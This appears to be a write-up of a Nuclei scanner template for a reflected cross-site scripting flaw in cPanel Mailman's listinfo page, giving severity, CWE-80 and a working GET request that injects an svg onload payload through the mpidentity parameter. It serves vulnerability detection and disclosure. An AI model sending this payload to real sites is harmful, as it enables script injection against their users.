# Nuclei Template: cPanel Mailman - Cross-Site Scripting
**Template ID:** cpanel-mailman-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`cpanel-mailman-xss.yaml`)

## Vulnerability Information & PoC

## Description
cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output encoding, resulting in reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E
```

## References
- https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities
